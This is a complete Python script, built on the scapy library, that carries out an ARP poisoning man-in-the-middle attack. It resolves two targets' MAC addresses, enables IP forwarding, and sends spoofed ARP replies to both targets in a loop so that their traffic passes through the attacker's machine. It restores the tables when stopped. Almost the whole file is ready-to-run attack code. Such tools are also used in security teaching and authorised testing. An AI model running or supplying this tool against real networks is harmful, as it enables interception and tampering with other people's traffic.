#!/usr/bin/python3

import sys
sys.stderr = None
from scapy.all import Ether, ARP, sendp, sr1, conf, get_if_hwaddr, send
import argparse
from time import sleep
from threading import Thread, Event
from os import getuid, system




class mitm():
    
    def __init__(self):
        
        #initialize the arguments parser
        self.parser = argparse.ArgumentParser(description="arp poisoning tool (mitm)")
        self.parser.add_argument("-t1", "--target1", required=True, help="ip address of the first target")
        self.parser.add_argument("-t2", "--target2", required=True, help="ip address of the second target")
        self.parser.add_argument("-i", "--iface", required=False, help="network interface to use (e.g., wlan0)")
        #parse arguments
        self.args = self.parser.parse_args()
        #colors
        self.Y = "\033[93m"
        self.R = "\033[91m"
        self.W = "\033[97m"
        self.G = "\033[92m"
        self.Res = "\033[0m"
        #event to signal threads to stop
        self.stop_event = Event()
        
        
            
        
    #// get mac address of the network interface being used 
    def getDeviceMAC(self):
        try:
           hwaddr = get_if_hwaddr(conf.iface)
           if hwaddr != "00:00:00:00:00:00":
               return hwaddr
        except OSError:
            print(f"[{self.R}ERROR{self.Res}] The specified network interface {self.Y}'{conf.iface}'{self.Res} is not valid.{self.Res}")
            exit(1)
    
    
    #// get mac address from ip address ( arp request ) 
    def getMACAddress(self,ip):
        try:
            print(f"[{self.Y}INFO{self.Res}] Attempting to retrieve {self.Y}MAC{self.Res} address {self.Y}for{self.Res} target IP{self.Y}: {ip}...{self.Res}")
            arp_request = ARP(pdst=ip)
            response = sr1(arp_request, timeout=2, verbose=False)
            for _ in range(5):
                if response:
                    return response.hwsrc
                    break
                response = sr1(arp_request, timeout=2, verbose=False)
                print(f"[{self.Y}INFO{self.Res}] Target {self.Y}{ip}{self.Res} seems down. Retrying...{self.Res}", end="\r")
            
                
        except Exception as Err:
            print(Err)
            exit(1)
    
    
    
    
    #// send arp replay         
    def sendARPReplay(self,sender_ip, sender_mac, target_ip, target_mac ):
        
        # craft an ARP replay packet
        arp_replay = Ether(dst=target_mac) / ARP(op="is-at")
        arp_replay[ARP].hwsrc = sender_mac  # Sender MAC address
        arp_replay[ARP].psrc =  sender_ip   # Sender IP address
        arp_replay[ARP].hwdst = target_mac   # Target MAC address
        arp_replay[ARP].pdst = target_ip      # Target IP address
        
        # send ARP replay
        sendp(arp_replay, verbose=False)
        
    
    #// poison target's arp table    
    def poisonARP(self, sender_ip, sender_mac, target_ip, target_mac):
        
        while not self.stop_event.is_set():
            sleep(0.3)
            self.sendARPReplay(sender_ip, sender_mac, target_ip, target_mac)
        
    
    #// restore target's arp table
    def restoreARP(self,target1_ip, target1_mac, target2_ip, target2_mac,):
        try:
            # - restore ARP table for target 1
            arp_response = ARP(op=2, pdst=target1_ip, hwdst=target1_mac, psrc=target2_ip, hwsrc=target2_mac)
            send(arp_response, count=4, verbose=False)
        
            # - restore ARP table for target 2
            arp_response = ARP(op=2, pdst=target2_ip, hwdst=target2_mac, psrc=target1_ip, hwsrc=target1_mac)
            send(arp_response, count=4, verbose=False)
        except AttributeError as AttErr:
            print(AttrErr)
    
    
    
    def run(self):
        try:
            if getuid() != 0:
                print(f"[{self.R}ERROR{self.Res}] This script requires root privileges. Please run as root or with sudo.{self.Res}")
                exit(13)
        
            if self.args.iface:
                conf.iface = self.args.iface
        
            DeviceMACAddress = self.getDeviceMAC()
            if not DeviceMACAddress:
                print(f"[{self.R}ERROR{self.Res}] Failed to get MAC address for interface '{self.R}{conf.iface}{self.Res}'")
                exit(1)
        
            target1_ip_address = self.args.target1
            target1_mac_address = self.getMACAddress(target1_ip_address)
            if not target1_mac_address:
                print(f"[{self.R}ERROR{self.Res}] Could not retrieve MAC address for {self.R}{target1_ip_address}{self.Res}")
                exit(1)
        
            target2_ip_address = self.args.target2
            target2_mac_address = self.getMACAddress(target2_ip_address)
            if not target2_mac_address:
                print(f"[{self.R}ERROR{self.Res}] Could not retrieve MAC address for {self.R}{target2_ip_address}{self.Res}")
                exit(1)
            
            
            
            # start the Attack
            Thread1 = Thread(target=self.poisonARP,args=(target2_ip_address, DeviceMACAddress, target1_ip_address, target1_mac_address))
            Thread2 = Thread(target=self.poisonARP,args=(target1_ip_address, DeviceMACAddress, target2_ip_address, target2_mac_address))
            
            
            print(f"[{self.Y}INFO{self.Res}] Attempting to enable {self.Y}IP{self.Res} forwarding{self.Y}...              {self.Res}")
            system("sysctl net.ipv4.ip_forward=1")
            print(f"[{self.Y}INFO{self.Res}] {self.Y}IP{self.Res} forwarding enabled successfully.")
            
            print(f"[{self.Y}INFO{self.Res}] Starting {self.Y}ARP{self.Res} Poisoning Attack{self.Y}...{self.Res}")
            print(f"[{self.Y}INFO{self.Res}] Target 1 IP{self.Y}: {self.G}{target1_ip_address}{self.Res}")
            print(f"[{self.Y}INFO{self.Res}] Target 1 MAC{self.Y}: {self.G}{target1_mac_address}{self.Res}")
            print(f"[{self.Y}INFO{self.Res}] Target 2 IP{self.Y}: {self.G}{target2_ip_address}{self.Res}")
            print(f"[{self.Y}INFO{self.Res}] Target 2 MAC{self.Y}: {self.G}{target2_mac_address}{self.Res}")
            print(f"[{self.Y}INFO{self.Res}] Sending {self.Y}ARP{self.Res} Spoofing Packets{self.Y}...{self.Res}")
            Thread1.start()
            print(f"[{self.Y}INFO{self.Res}] Sending {self.Y}ARP{self.Res} replies to {self.Y}{target1_ip_address}{self.Res} claiming to be {self.Y}{target2_ip_address}...{self.Res}")
            Thread2.start()
            print(f"[{self.Y}INFO{self.Res}] Sending {self.Y}ARP{self.Res} replies to {self.Y}{target2_ip_address}{self.Res} claiming to be {self.Y}{target1_ip_address}...{self.Res}")
            print(f"[{self.Y}INFO{self.Res}] Attack {self.Y}in{self.Res} progress{self.Y}...{self.Res} Press {self.Y}Ctrl+C{self.Res} to stop.")
            Thread1.join()
            Thread2.join()
            
        except KeyboardInterrupt as ki:
            sys.stderr = sys.__stderr__
            self.stop_event.set()
            
            print(f"[{self.Y}INFO{self.Res}] Stopping {self.Y}ARP{self.Res} Poisoning Attack{self.Y}...{self.Res}")
            sleep(1)
            print(f"[{self.Y}INFO{self.Res}] Restoring {self.Y}ARP{self.Res} Tables{self.Y}...{self.Res}")
            self.restoreARP(target1_ip_address,target1_mac_address,target2_ip_address,target2_mac_address)
            print(f"[{self.Y}INFO{self.Res}] {self.Y}ARP{self.Res} Tables Restored Successfully.{self.Res}")
            print(f"[{self.Y}INFO{self.Res}] Disableing {self.Y}IP{self.Res} forwarding{self.Y}...{self.Res}")
            system("sysctl net.ipv4.ip_forward=0")
            
            
        
if __name__ == "__main__":
    mitm = mitm()
    mitm.run()
    
    
